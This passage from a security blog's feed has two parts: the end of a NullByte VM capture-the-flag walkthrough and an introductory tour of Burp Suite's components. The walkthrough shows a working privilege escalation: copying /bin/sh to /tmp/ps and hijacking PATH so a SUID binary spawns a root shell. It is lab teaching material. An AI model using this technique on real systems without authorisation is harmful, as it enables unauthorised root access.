kjxYRRryD57olIyb9GsQgZkvPjHCg5JMdzQqOBoJZFPw/nNCEwQexWrgW7bqL/N8
TM2C0X57+ok7eqj8gUEuX/6FxBtYPpqUIaRT9kdeJPYHsiLJlZcXM0HZrPVvt1HU
Gms=
=PiAQ
&mdash;&mdash;-END PGP PUBLIC KEY BLOCK&mdash;&mdash;&ndash;
```</p>

<p>After completing this and looking at other walkthroughs to see alternate ways of exploitation, I realized that I completely missed the way this VM was supposed to be exploited, so below is the intended way of solving this:</p>

<p>Inside ramses' home folder is a <strong>.bash_history</strong> file that I neglected reading:</p>

<p><code>plain
sudo -s
su eric
exit
ls
clear
cd /var/www
cd backup/
ls
./procwatch
clear
sudo -s
cd /
ls
exit
</code></p>

<p>An interesting path and binary. Let&rsquo;s see it on the filesystem:</p>

<p><code>plain
ls -l /var/www/backup
total 12
-rwsr-xr-x 1 root root 4932 Aug  2  2015 procwatch
-rw-r--r-- 1 root root   28 Aug  2  2015 readme.txt
cat readme.txt
I have to fix this mess...
</code></p>

<p>A SUID executable and a comment alluding to a mess..hmm, what could go wrong here..</p>

<p><code>plain
./procwatch
  PID TTY          TIME CMD
 1535 pts/0    00:00:00 procwatch
 1536 pts/0    00:00:00 sh
 1537 pts/0    00:00:00 ps
</code></p>

<p>This looks like the output of the <strong>ps</strong> command. Let&rsquo;s see a normal ps:</p>

<p><code>plain
ps
  PID TTY          TIME CMD
 1555 pts/0    00:00:00 bash
 1605 pts/0    00:00:00 ps
</code></p>

<p>I played around with the executable, tried passing arguments, but it looks like it just calls ps and nothing else. In the ps manual, I paid attention to this:</p>

<blockquote><p>By default, ps selects all processes with the same effective user ID
(euid=EUID) as the current user and associated with the same terminal
as the invoker.</p></blockquote>

<p>So, we can see the succession for a normal ps is bash &ndash;> ps, and for the SUID binary is procwatch &ndash;> sh &ndash;> ps. Maybe we can intercept the call to ps by creating an arbitrary binary called ps and placing it in the PATH variable. And of course, we want a shell!</p>

<p><code>plain
cp /bin/sh /tmp/ps
</code></p>

<p>Let&rsquo;s look at the PATH environment variable:</p>

<p><code>plain
echo $PATH
/usr/local/bin:/usr/bin:/bin:/usr/local/games:/usr/games
</code></p>

<p>Ok, since I&rsquo;ve placed the fake ps in /tmp, I want to add that to the path:</p>

<p><code>plain
export PATH=/tmp:/usr/local/bin:/usr/bin:/bin:/usr/local/games:/usr/games
ramses@NullByte:/var/www/backup$ echo $PATH
/tmp:/usr/local/bin:/usr/bin:/bin:/usr/local/games:/usr/games
</code></p>

<p>Fingers crossed, running procwatch again:</p>

<p>``` plain
ramses@NullByte:/var/www/backup$ ./procwatch</p>

<h1>whoami</h1>

<p>root
```</p>

<p>And we&rsquo;re root..the right way! :D</p>

<p>``` plain
/ You&rsquo;ll wish that you had done some of \
| the hard things when they were easier |
\ to do.                                /</p>

<hr />

<pre><code>    \   ^__^
     \  (oo)\_______
        (__)\       )\/\
            ||----w |
            ||     ||
</code></pre>

<p>```</p>
]]></content>
  </entry>
  
  <entry>
    <title type="html"><![CDATA[Introduction to Burp Suite]]></title>
    <link href="http://chousensha.github.io/blog/2016/11/19/introduction-to-burp-suite/"/>
    <updated>2016-11-19T17:01:23-05:00</updated>
    <id>http://chousensha.github.io/blog/2016/11/19/introduction-to-burp-suite</id>
    <content type="html"><![CDATA[<p>Yes, the time has come for a full post on Burp Suite! I have delayed it for too long!</p>

<p>Before starting, here are some resources for learning about Burp:</p>

<p><a href="https://portswigger.net/burp/help/contents.html">Burp Suite Documentation</a></p>

<p><a href="http://aetherlab.teachable.com/p/burp-suite">Free introductory course on Burp Suite</a></p>

<p><a href="https://vimeo.com/album/3510171">Burp Suite for Web Application Security</a></p>

<!-- more -->


<p>Burp Suite is the primary tool used for performing web application security assessments. It acts as a proxy between your browser and the target, and it comes packed with powerful features to assist in penetration testing: spidering fuctionality, web scanning for vulnerabilities (pro version only), tools that allow you to perform different actions with web requests (will be covered in detail below), and customization ability through plugins.</p>

<h1>Introduction to Burp Suite</h1>

<p>Burp is a Java application, so you need to have Java installed (version 1.6 or later) to run it. It comes pre-installed in Kali, where you can find it in the Web Application Analysis category.</p>

<p>To use Burp, you need to configure your browser&rsquo;s proxy settings. Burp&rsquo;s proxy is listening on 127.0.0.1:8080. If you want to manually configure your browser to use it, refer to this <a href="https://portswigger.net/burp/help/suite_gettingstarted.html">getting started post</a>. I recommend using a browser add-on like <a href="https://addons.mozilla.org/en-US/firefox/addon/foxyproxy-standard/">FoxyProxy</a> to set up your proxies and toggle them with a click.</p>

<p>For <strong>Burp to work with HTTPS</strong> requests, you need to add Burp&rsquo;s CA certificate to your browser. Go to <a href="http://burp/">http://burp/</a> and click on CA Certificate to download it to your computer. In this demo I&rsquo;m using Firefox, but the steps should be similar in the rest of the browsers. In the Firefox menu, select Options or Preferences, then go to Advanced &ndash;> Certificates &ndash;> View Certificates. Click on the Authorities tab and choose Import to select your CA certificate, and check the option &ldquo;Trust this CA to identify web sites&rdquo;. Then click Ok, and restart Firefox. Burp should work now with HTTPS traffic, without issuing any security warnings.</p>

<h1>Burp Suite components</h1>

<p>The power of Burp comes from the interaction between its components, which you can individually access from the application tabs. Let&rsquo;s see each of them in action!</p>

<h2>Target</h2>

<p>Here you can see information about your target. The site map constructs a hierarchical representation of your target. Items requested are shown in black, those that Burp inferred from links etc. are in gray. As you browse with the proxy on, Burp will keep building the site map.</p>

<p><img class="center" src="/images/tools/burp/sitemap.png" title="&lsquo;sitemap&rsquo; &lsquo;target sitemap&rsquo;" ></p>

<p>You can configure the scope of your targets from the Scope tab. Alternately, you can right-click on the sitemap entries to perform other actions:</p>

<p><img class="center" src="/images/tools/burp/sitemap-menu.png" title="&lsquo;sitemap menu&rsquo; &lsquo;target sitemap menu&rsquo;" ></p>

<p>Clicking on the Filter bar lets you customize filtering options. Before starting the demo, I added my target to the scope and selected to hide the out-of scope items for a clearer view.</p>

<p><img class="center" src="/images/tools/burp/sitemap-filter.png" title="&lsquo;sitemap filter&rsquo; &lsquo;target sitemap filter&rsquo;" ></p>

<h2>Proxy</h2>

<p>This is the component that allows you to intercept and modify the requests between your browser and the target. You will get familiar with the Intercept tab, where you can inspect each request and response, modify it, or send it to other tools. The history tabs keep records for the HTTP and WebSockets messages. In the Options tab you have a plethora of configuration options for your Proxy. Take special note of the Response Modification options, which you can use to automatically modify the responses HTML to remove client-side logic and controls, or perform SSL stripping.</p>

<p><img class="center" src="/images/tools/burp/proxy-options.png" title="&lsquo;proxy response options&rsquo; &lsquo;response modification options&rsquo;" ></p>

<p>Right-clicking in the Raw tab will give you more options, among which there are some very useful ones such as copying the request as a Curl command, or constructing selected strings in Javascript and SQL (MySQL, Oracle, MS-SQL)</p>

<h2>Spider</h2>

<p>You can use Burp&rsquo;s spider to automatically crawl target applications. After you&rsquo;ve manually browsed the application, right-click the host or URL that you want to crawl in the site map, and choose &ldquo;Spider this host / branch&rdquo;. Then watch the number of requests being made in the Control tab. You can customize the spider in the Options tab. Passive spidering is enabled by default, allowing Burp to update the site map while you are manually browsing. Also, you can specify what the spider should do when encountering forms (ignoring them, automatically submitting with pre-determined values, prompting for guidance etc.) Be careful, as the spider may perform actions with repercussions on the target application, so an initial manual assessment followed by a strict configuration of the spidering scope would be preferred.</p>

<h2>Scanner</h2>

<p>Burp has an automatic vulnerability scanner <em>uncontrolled drooling</em> that seems excellent from the reviews, but it&rsquo;s only available for Pro users. If you look in the Issue definitions tab, you can see the <a href="https://portswigger.net/KnowledgeBase/Issues/">vulnerabilites that Burp can detect</a>, among with a description for each of them <em>drooling intensifies</em></p>

<p><img class="center" src="/images/tools/burp/scanner.png" title="&lsquo;burp scanner&rsquo; &lsquo;burp web scanner&rsquo;" ></p>

<h2>Intruder</h2>

<p>With Burp Intruder you can perform highly-customized automated attacks against your targets, including brute forcing, fuzzing, enumeration etc. Usually, you select an interesting request and send it to Intruder. You can see the positions where payloads will be placed, marked in orange in this dummy request:</p>

<p><img class="center" src="/images/tools/burp/intruder-position.png" title="&lsquo;intruder positions&rsquo; &lsquo;intruder payload positions&rsquo;" ></p>

<h3>Attack types</h3>

<p>In the Position tab, you can also choose the type of attack you want to perform:</p>

<ul>
<li><p><strong>Sniper</strong> &ndash; single set of payloads, places each payload into each position in turn, useful for individual parameter fuzzing</p></li>
<li><p><strong>Battering ram</strong> &ndash; single set of payloads, places the the same payload into all positions at the same time</p></li>
<li><p><strong>Pitchfork</strong> &ndash; multiple payload sets, different payload set for each position</p></li>
<li><p><strong>Cluster bomb</strong> &ndash; multiple payload sets, tests all permutations of the payload combinations, so depending on your payloads, this attack might grow to gigantic proportions</p></li>
</ul>


<h3>Payload types</h3>

<p>You have lots of payload types available for testing, so choose what is appropriate for your target:</p>

<ul>
<li><p><strong>Simple list</strong> &ndash; list of strings</p></li>
<li><p><strong>Runtime file</strong> &ndash; read strings at runtime from a file (for very large lists)</p></li>
<li><p><strong>Custom iterator</strong> &ndash; permutations of characters in multiple lists</p></li>
<li><p><strong>Character substitution</strong> &ndash; substitute characters, for instance when you are testing for 53cur3 p455w0rd5</p></li>
<li><p><strong>Case modification</strong> &ndash; change the characters' case according to the pre-defined rules</p></li>
<li><p><strong>Recursive grep</strong> &ndash; recursively extract data from the responses of previous requests</p></li>
<li><p><strong>Illegal Unicode</strong> &ndash; by using illegal Unicode representations, it might be possible to bypass filters etc.</p></li>
<li><p><strong>Character blocks</strong> &ndash; creates blocks of characters of specified sizes, can aid in detecting buffer overflows</p></li>
<li><p><strong>Numbers</strong> &ndash; numeric payloads</p></li>
<li><p><strong>Dates</strong> &ndash; date values</p></li>
<li><p><strong>Brute forcer</strong> &ndash; sets of permutations generated from specified characters</p></li>
<li><p><strong>Null payloads</strong> &ndash; empty string payloads</p></li>
<li><p><strong>Character frobber</strong> &ndash; changes the value of each character in turn, useful for determining what characters are being used for session tokens etc.</p></li>
<li><p><strong>Bit flipper</strong> &ndash; flips individual bits in the payload</p></li>
<li><p><strong>Username generator</strong> &ndash; generates usernames from the given input</p></li>
<li><p><strong>ECB block shuffler</strong> &ndash; shuffles ECB-encrypted blocks</p></li>
<li><p><strong>Extension generated</strong> &ndash; uses an extension to create the payloads</p></li>
<li><p><strong>Copy other payload</strong> &ndash; copies the current payload value to a different position</p></li>
</ul>


<h2>Repeater</h2>

<p>This tool is useful for sending requests over and over to the target application.</p>

<p><img class="center" src="/images/tools/burp/repeater.png" title="&lsquo;repeater&rsquo; &lsquo;repeater&rsquo;" ></p>

<h2>Sequencer</h2>

<p>With the Sequencer tool you can test for the randomness of data tokens in an target application. The analysis is more accurate if the number of captured tokens is larger.</p>

<p><img class="center" src="/images/tools/burp/sequencer.png" title="&lsquo;Burp sequencer&rsquo; &lsquo;Burp sequencer&rsquo;" ></p>

<h2>Decoder</h2>

<p>The Decoder tool performs encoding and decoding of different data formats, such as HTML, URL, Base64, ASCII hex, Hex, Octal, Binary, Gzip, and it also has hashing functionality for MD2, SHA-224, MD5, SHA1, SHA-384, SHA, SHA-512 and SHA-256.</p>

<p><img class="center" src="/images/tools/burp/decoder.png" title="&lsquo;Burp decoder&rsquo; &lsquo;Burp decoder&rsquo;" ></p>

<h2>Comparer</h2>

<p>If you want to compare different responses, this tool gives you the options of words or bytes comparison</p>

<p><img class="center" src="/images/tools/burp/comparer.png" title="&lsquo;Burp comparer&rsquo; &lsquo;Burp comparer&rsquo;" ></p>

<h2>Extender</h2>

<p>Here you can add extensions to Burp that add more functionality than what is available by default. Take a look at what extensions you can find in the BApp Store:</p>

<p><img class="center" src="/images/tools/burp/extensions.png" title="&lsquo;burp extensions&rsquo; &lsquo;burp extensions&rsquo;" ></p>

<p>In this screenshot I am sorting by rating. There are many extensions available and I suggest looking at each and determining if you will need it before choosing to install.</p>

<h3>Burp Clickbandit</h3>

<p>We&rsquo;re done with the main tools, but Burp has more. It even includes a cool tool for creating clickjacking attacks.</p>

<p><img class="center" src="/images/tools/burp/clickbandit.png" title="&lsquo;burp clickbandit&rsquo; &lsquo;burp clickbandit&rsquo;" ></p>

<p>In a future post I will do a lab featuring Burp&rsquo;s capabilities that I&rsquo;ve enumerated so far. Expect some Mutillidae! :&ndash;)</p>

<p>``` plain</p>

<hr />

<p>/ Don&rsquo;t you wish you had more energy&hellip; \
\ or less ambition?                     /</p>

<hr />

<pre><code>    \   ^__^
     \  (oo)\_______
        (__)\       )\/\
            ||----w |
            ||     ||
</code></pre>

<p>```</p>
]]></content>
  </entry>
  
</feed>
